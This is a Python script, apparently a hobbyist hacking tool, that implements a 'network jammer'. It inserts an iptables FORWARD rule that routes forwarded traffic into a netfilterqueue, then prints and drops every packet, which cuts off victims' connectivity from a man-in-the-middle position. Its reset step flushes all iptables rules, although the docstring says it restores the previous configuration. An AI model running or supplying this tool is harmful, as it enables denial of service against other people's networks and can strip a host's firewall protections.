#########################################################################
# Author : Dhrumil Mistry
#########################################################################


#########################################################################
# If you encounter Import error after installing netfilter use command 
# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
#########################################################################


from subprocess import call
import netfilterqueue

############################### Functions ############################### 
def forward_packets():
    '''
    configures the mitm for incoming request packets
    into a queue.

    Args:
        None

    Returns: 
        None
    '''

    # executing the following command
    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
    # -I -> insert (packet into a chain specified by the user)
    # -j -> jump if the packet matches the target.
    # --queue-num -> jump to specfic queue number
    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)


def reset_config():
    '''
    resets the configurations changed while exectution of the program to 
    its original configuration

    Args:
        None

    Returns: 
        None
    '''
    call('sudo iptables --flush', shell=True)


def process_packet(packet):
    '''
    process received packet, everytime a packet is received.
    prints the packet received in the queue and drops packet

    Args:
        packet (scapy.IP): IP packet from netfiterqueue/iptables 

    Returns: 
        None
    '''
    print(packet)
    packet.drop()
    

def run():
    '''Start network jammer

    Args:
        None

    Returns:
        None
    '''
    print('[*] configuring packet receiver...')

    forward_packets()
    print('[*] packet receiver configured successfully.\n')

    print('[*] Creating Queue to start receiving packets.')
    try:
        queue = netfilterqueue.NetfilterQueue()
    # Bind queue with queue-number 0
        queue.bind(0, process_packet)
        queue.run()

    except OSError as e:
        print('[-] Run script with root priviliges.')
        print(e)

    except Exception:
        print('[-] An Exception occurred while creating queue.\n', Exception)

    finally:
        print('[*] Restoring previous configurations.. please be patient...')
        reset_config()

        print('[-] Program stopped.')


if __name__ == '__main__':
    run()
